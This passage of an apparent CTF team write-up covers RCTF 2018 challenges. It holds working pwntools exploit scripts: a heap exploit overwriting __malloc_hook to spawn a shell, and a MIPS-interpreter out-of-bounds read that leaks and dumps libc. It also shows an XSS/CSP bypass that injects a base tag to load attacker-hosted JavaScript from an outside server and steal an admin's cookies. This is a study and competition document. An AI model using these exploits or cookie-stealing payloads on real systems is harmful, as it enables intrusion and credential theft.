</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>unsorted</span> <span class=o>=</span> <span class=n>alloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=n>unsorted</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>show</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x3c4b78</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;@ 0x</span><span class=si>{:012x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Linking fake chunk&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc_hook</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x3c4b10</span>
</span></span><span class=line><span class=cl><span class=n>fake_fast_addr</span> <span class=o>=</span> <span class=n>malloc_hook</span> <span class=o>-</span> <span class=mi>27</span> <span class=o>-</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x80</span> <span class=o>+</span> <span class=s1>&#39;B&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x71</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_fast_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Overwriting __malloc_hook&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>one_gadget</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x4526a</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mi>19</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>one_gadget</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;Popping shell&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span> <span class=n>final</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># $ cat flag</span>
</span></span><span class=line><span class=cl><span class=c1># RCTF{Let_us_w4rm_up_with_a_e4sy_NU11_byte_overflow_lul_7adf58}</span>
</span></span></code></pre></div><h2 class="relative group">rBlog 2018<div id=rblog-2018 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#rblog-2018 aria-label=Anchor>#</a></span></h2><h3 class="relative group">Overview<div id=overview-8 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#overview-8 aria-label=Anchor>#</a></span></h3><p>We&rsquo;re greeted with a simple blog platform, with the possibility to make the admin visit a post. Our objective is to steal the admin cookie.</p><p>We quickly found 2 potential XSS, a standard one in the title, and one in the style selector which allows to load local scripts (bypassing the CSP nonce).</p><p>The CSP is fairly strict, so we can&rsquo;t use inline js or script tags (because of the nonce):
<code>default-src 'none'; script-src 'nonce-0672df2f3f6c548295847afc13c69f87'; frame-src https://www.google.com/recaptcha/; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src fonts.gstatic.com; img-src 'self'</code></p><h4 class="relative group">The intended solution<div id=the-intended-solution class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-intended-solution aria-label=Anchor>#</a></span></h4><p>The intended solution was to upload a image, which contained valid JS code, and to execute the uploaded file using the script inclusion in the style selector.
However, most browsers block script with a audio/video/image MIMEtype, so the uploaded image had to be a WebP (which, apparently, has no MIMEtype).
This is very similar to the PlaidCTF2018 challenge idIoT: Action (with a WAVE file, but the execution is the same).
However, we solved it in another (probably unintended) way:</p><h4 class="relative group">What real hackers do:<div id=what-real-hackers-do class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#what-real-hackers-do aria-label=Anchor>#</a></span></h4><p>By checking carefully the CSP using <a href=https://csp-evaluator.withgoogle.com/ target=_blank>https://csp-evaluator.withgoogle.com/</a>, we realized the <code>base-uri</code> directive was missing.
This is a huge oversight: to solve the challenge, all we had to do was to put in the title <code>&lt;base href="http://ourserver.com/" target="_blank"></code>, and to set up ourserver.com to serve a malicious js file at <a href=http://npicca.ga:8000/assets/js/jquery.min.js target=_blank>http://npicca.ga:8000/assets/js/jquery.min.js</a>, which will be loaded by the admin.
We send the page to the admin and we get the cookies:
<code>RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012}; hint_for_rBlog_Rev.2=http://rblog.2018.teamrois.cn/blog.php/52c533a30d8129ee4915191c57965ef4c7718e6d</code></p><h2 class="relative group">rBlog 2018 v2<div id=rblog-2018-v2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#rblog-2018-v2 aria-label=Anchor>#</a></span></h2><p>In the hint from the previous solution, we found the screenshot of a command line running Parcel Development Server.
We run a copy of that on our server, and found out it has a feature called <a href=https://parceljs.org/hmr.html target=_blank>Hot Module Replacement</a>. This feature includes a script in the boundle, that connects to a WebSocket server and listen for file updates.</p><p>The first problem is that the WebSocket port is randomized at every run of the server, unless specified in the command line (and from the screenshot it&rsquo;s not the case).
Luckily Parcel Development Server has really open <a href=https://github.com/parcel-bundler/parcel/blob/master/src/Server.js#L20 target=_blank>CORS Headers</a>.
We fetched the index and app.js pages using XMLHTTPRequest and found out the WebSocket port. We also found out the site is empty, just an empty html file and a <code>document.write</code> troll instruction.</p><p>We lost most of our time trying to force the page to connect to another WebSocket server, so we could push a custom update event and inject code into the page. Unfortunatly the address is taken from <code>location.hostname</code>, and there&rsquo;s no way to change that variable without loosing access to the cookies.
As a last resource, we decided to connect to the WebSocket server and listen from incoming updates, maybe someone is updating the files with the flag. Since WebSocket doesn&rsquo;t care about SOP, and we have have the address and the port, we just connected to it and sent every date we recieved to our server.
We received an update with the flag as a javascript comment in app.js, nice!</p><h2 class="relative group">520gift<div id=520gift class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#520gift aria-label=Anchor>#</a></span></h2><p>We are given a zip with 17 pics of different lipsticks, a cosmetic brand name and a hint about finding their color name first. As if that wasn&rsquo;t enough, reverse searching the images leads only to Chinese sites. And after a ridiculous amount of time, we finally found the original poster on weibo, and of course we need an account to see all her posts (which, of course, we cannot register because of the mobile number), but &ldquo;luckily&rdquo; we found a mirror which didn&rsquo;t require registration.
We then proceeded to examine a countless amount of lipstick pics, trying to match them with the 17 given to us, and in the end we end up with all the lipstick names. The initial letters of the first 4 names form &ldquo;rctf&rdquo;, so we tried to add braces and fill with the other initials and it worked.</p><h2 class="relative group">Number magic<div id=number-magic class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#number-magic aria-label=Anchor>#</a></span></h2><p>After solving a POW, we are greeted with a message describing the game: we need to guess a sequence of <code>k</code> unique integers in a specified range (e.g. <code>[0,10)</code>) using up to a fixed number of guesses; after each guess we are given two integers as feedback (without specifying their nature).
After a couple of tries, it&rsquo;s pretty obvious that we are playing a variation of Mastermind (i.e. the feedback is the number of colors in the right position and the number of colors in the wrong position but present in the solution) where we cannot choose multiple colors, so we just need a solver for it. We end up writing the solver instead of using something else because it wasn&rsquo;t specified whether the number of pegs <code>k</code> or the number of colors could change.</p><h3 class="relative group">Code<div id=code class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#code aria-label=Anchor>#</a></span></h3><pre tabindex=0><code>from pwn import *
import hashlib, itertools, re, random

def scoreThis(guess, truth):
    a = 0
    for i in xrange(len(guess)):
        if guess[i] == truth[i]:
            a+=1
    b = len(set(guess).intersection(set(truth))) - a
    return a, b
def score(guess, S):
    worst = 0
    outcome = {}
    for s in S:
        z = scoreThis(guess, s)
        if z not in outcome: outcome[z] = 0
        outcome[z] += 1
    for k,v in outcome.items():
        worst = max(worst, v)
    return worst

def play(guess):
    r.sendline(&#34; &#34;.join(map(str, guess)))
    z = r.recvline()
    print z
    if &#34;Nope&#34; in z:
        z = z.replace(&#34;,&#34;,&#34;&#34;).split()
        return int(z[1]), int(z[2])
    else:
        return -1, -1

def solve(N, U, T):
    S = set(itertools.permutations(range(U), N))
    it = 0
    while (True):
        print &#34;{}/{}&#34;.format(it, T)
        print len(S)
        if it &gt; 0:
            guess = [len(S)+1, None]
            for s in S:
                sc = score(s, S)
                if sc &lt; guess[0]:
                    guess = [sc, s]
        else:
            guess = [-1, [i for i in xrange(N)]]
        print guess
        guess = guess[1]
        a,b = play(guess)
        print a,b
        if a == -1:
            break
        rem = []
        for s in S:
            if scoreThis(guess, s) != (a,b):
                rem.append(s)
        for s in rem:
            S.remove(s)
        it += 1
    print list(S)[0]

r = remote(&#39;149.28.139.172&#39;, 10002)

def captcha(r):
    line = r.readline().strip()

    target = line.split(&#39; &#39;)[-1]
    suffix = line.split(&#39;)&#39;)[0].split(&#39;+&#39;)[1]

    print &#39;[+] Captcha for&#39;, target, suffix

    alpha = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;
    for a,b,c,d in itertools.product(alpha, repeat=4):
        if hashlib.sha256(a+b+c+d+suffix).hexdigest() == target:
            r.sendline(a+b+c+d)
            return
    print &#39;[x] no luck with captcha&#39;
    exit(1)

captcha(r)

while True:
    try:
        r.recvuntil(&#34;=====&#34;)
    except:
        print r.clean(0)
        break
    print r.recvline().strip()
    l = r.recvline().strip()
    print l
    p = re.search(&#34;Give me (\d+) numbers, in\[0, (\d+)\), You can only try (\d+) times&#34;, l)
    N, U, T = map(lambda x: int(p.group(x)), range(1,4))
    print N, U, T
    solve(N,U,T)

r.interactive()
</code></pre><h2 class="relative group">Simulator<div id=simulator class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#simulator aria-label=Anchor>#</a></span></h2><p><a href="https://drive.google.com/open?id=1KjU5NByCi1lqserfBs-JUbveE1tGUk7q" target=_blank>Attachment(original link)</a></p><h3 class="relative group">Overview<div id=overview-9 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#overview-9 aria-label=Anchor>#</a></span></h3><p>We are given a 32-bit Linux ELF executable which is a MIPS interpreter.
Checksec shows canaries and NX, but only partial RELRO and no PIE.
It accepts the following MIPS istructions: <code>add</code>, <code>sub</code>, <code>slt</code>, <code>and</code>, <code>or</code>, <code>syscall</code>, <code>beq</code>, <code>lw</code>, <code>sw</code>, <code>li</code>, <code>mov</code>, and <code>j</code>.
We have the usual registers: <code>zero</code>, <code>at</code>, <code>v0</code>, <code>v1</code>, <code>a0-a3</code>, <code>t0-t9</code>, <code>s0-s7</code>, <code>k0</code>, <code>k1</code>, <code>gp</code>, <code>sp</code>, <code>fp</code>, and <code>ra</code>.
Each register is stored in the BSS and the program reserves 4 bytes in order to store the content.
Two memory regions are mapped in order to store instructions (starts at 0x5000000) and data (starts at 0x4000000).
All the MIPS instructions we give to the program are executed by an interpreter that works on registers (in the BSS) and data (0x4000000).
Moreover, the <code>syscall</code> instruction with <code>v0</code> equal to 1 does a printf of the integer value stored in the register <code>t0</code>.</p><h3 class="relative group">Vulnerability<div id=vulnerability-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#vulnerability-1 aria-label=Anchor>#</a></span></h3><p>Our idea is to bypass the checks made by the <code>lw</code> and <code>sw</code> instructions to read (with the <code>syscall</code>) and write in other memory regions, outside the boundaries of the data mapping.
The check is:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>address</span> <span class=o>&gt;</span> <span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Memory access error&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>Here, <code>address</code> is signed.
Therefore, if we set the MSB the check passes.
The value of the address is then multiplied by 8, summed to 0x4000004 and truncated to 32 bits.
We can thus read and write 4 bytes at addresses that are congruent to 4 (mod 8).
Note that the result of the multiplication is not altered by the MSB we set, because of integer overflow.</p><h3 class="relative group">Leaking libc&rsquo;s position<div id=leaking-libcs-position class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#leaking-libcs-position aria-label=Anchor>#</a></span></h3><p>This part requires a bit of math to get an arbitrary read on the GOT, where we leaked the address of <code>strcmp</code> and <code>strchr</code>.
We couldn&rsquo;t find the libc that was being used, so we first found the offset between <code>strcmp</code> and the libc base by going backwards 4K at a time until a crash (because there&rsquo;s nothing between the binary and libc).
To do this, we subtracted 0x4000004 from the <code>strcmp</code> address, divided by 8 (with an ad hoc MIPS function), set the MSB and then iterated in a cycle in which we attempt an <code>lw</code>, subtract 512 and repeat.
This is the script:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>itertools</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>sha256</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pow</span><span class=p>(</span><span class=n>todo</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>todo</span> <span class=o>==</span>  <span class=kc>True</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;simulator.2018.teamrois.cn&#34;</span><span class=p>,</span> <span class=mi>3131</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>chall</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>alpha</span> <span class=o>=</span> <span class=s1>&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>,</span><span class=n>c</span><span class=p>,</span><span class=n>d</span> <span class=ow>in</span> <span class=n>itertools</span><span class=o>.</span><span class=n>product</span><span class=p>(</span><span class=n>alpha</span><span class=p>,</span> <span class=n>repeat</span><span class=o>=</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=n>sha256</span><span class=p>(</span><span class=n>chall</span> <span class=o>+</span> <span class=n>a</span> <span class=o>+</span> <span class=n>b</span> <span class=o>+</span> <span class=n>c</span> <span class=o>+</span> <span class=n>d</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\0\0\0</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>==</span> <span class=kc>True</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>sol</span> <span class=o>=</span> <span class=n>a</span> <span class=o>+</span> <span class=n>b</span> <span class=o>+</span> <span class=n>c</span> <span class=o>+</span> <span class=n>d</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>sol</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>conn</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./simulator&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>div8</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>lines</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;li $v0, 0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;li $t0, 1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>reversed</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mi>32</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;li $t1, </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;slt $t2, $a0, $t1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;beq $t2, $t0, div8_</span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;sub $a0, $a0, $t1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;li $t1, </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=p>(</span><span class=n>i</span><span class=o>-</span><span class=mi>3</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;add $v0, $v0, $t1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s1>&#39;div8_</span><span class=si>{}</span><span class=s1>:&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>lines</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># leak strcmp, go back 4k until crash</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>li $t0, 2155911681
</span></span></span><span class=line><span class=cl><span class=s2>lw $a0, $t0
</span></span></span><span class=line><span class=cl><span class=s2>li $v0, 1
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>sub $a0, $a0, 67108868
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span> <span class=o>+</span> <span class=n>div8</span><span class=p>()</span> <span class=o>+</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>li $t0, 2147483648
</span></span></span><span class=line><span class=cl><span class=s2>add $a0, $v0, $t0
</span></span></span><span class=line><span class=cl><span class=s2>find_base:
</span></span></span><span class=line><span class=cl><span class=s2>lw $t0, $a0
</span></span></span><span class=line><span class=cl><span class=s2>li $v0, 1
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>sub $a0, $a0, 512
</span></span></span><span class=line><span class=cl><span class=s2>j find_base
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Solving PoW&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Sending code&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;END&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Leaking strcmp&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>strcmp</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>conn</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;0x</span><span class=si>{:08x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>strcmp</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Finding libc base&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>val</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>conn</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>libc</span> <span class=o>=</span> <span class=p>((</span><span class=n>val</span> <span class=o>*</span> <span class=mi>8</span> <span class=o>+</span> <span class=mh>0x4000004</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span><span class=p>)</span> <span class=o>&amp;</span> <span class=o>~</span><span class=mh>0xfff</span>
</span></span><span class=line><span class=cl><span class=k>except</span> <span class=p>(</span><span class=ne>EOFError</span><span class=p>,</span> <span class=ne>ValueError</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>pass</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;0x</span><span class=si>{:08x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>libc</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;Offset = 0x</span><span class=si>{:x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>strcmp</span> <span class=o>-</span> <span class=n>libc</span><span class=p>))</span>
</span></span></code></pre></div><h3 class="relative group">Dumping libc<div id=dumping-libc class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#dumping-libc aria-label=Anchor>#</a></span></h3><p>Now that we know where the libc base is (relative to <code>strcmp</code>), we wrote another script to dump libc.
The address calculation is very similar to the previous script.
We can only read at addresses congruent to 4 (mod 8), so we&rsquo;ll get a dump that alternates between 4 unknown bytes and 4 leaked bytes.
This is the script:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>itertools</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>sha256</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pow</span><span class=p>(</span><span class=n>todo</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>todo</span> <span class=o>==</span>  <span class=kc>True</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;simulator.2018.teamrois.cn&#34;</span><span class=p>,</span> <span class=mi>3131</span><span class=p>)</span>
